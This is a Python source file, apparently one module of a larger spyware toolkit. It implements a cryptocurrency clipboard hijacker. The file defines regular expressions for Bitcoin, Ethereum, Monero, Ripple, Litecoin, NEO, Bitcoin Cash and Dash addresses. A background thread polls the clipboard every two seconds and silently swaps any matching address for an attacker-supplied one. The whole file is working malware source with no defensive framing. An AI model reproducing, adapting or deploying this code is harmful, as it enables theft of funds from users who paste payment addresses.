
# Import modules
from re import match
from time import sleep
from threading import Thread
import Spying.Clipboard as clipboard

# Regular expressions
regex_addresses = {
    "btc": r"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)",
    "eth": r"(?:^0x[a-fA-F0-9]{40}$)",
    "xmr": r"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)",
    "xrp": r"(?:^r[0-9a-zA-Z]{24,34}$)",
    "ltc": r"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)",
    "neo": r"(?:^A[0-9a-zA-Z]{33}$)",
    "bch": r"^((bitcoincash:)?(q|p)[a-z0-9]{41})",
    "dash": r"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)",
}

""" Clipper class """
class Clipper:

    # Constructor
    def __init__(self, **kwargs):
        self.addresses = kwargs
        self.__stopped = None
        self.__thread = self.__NewThread()
        self.__sleep = 2

    # Run clipboard checker
    def __Run(self):
        while not self.__stopped:
            content = clipboard.Get()
            for cryptocurrency, regex in regex_addresses.items():
                if match(regex, content) and cryptocurrency in self.addresses and content != self.addresses[cryptocurrency]:
                    clipboard.Set(self.addresses[cryptocurrency])
                    break
            sleep(self.__sleep)

    # Return new thread
    def __NewThread(self):
        return Thread(target=self.__Run)

    # Start clipper
    def Start(self):
        self.__stopped = False
        self.__thread.start()

    # Stop clipper
    def Stop(self):
        self.__stopped = True
        self.__thread.join()


# match(btc, "mybtcWaller")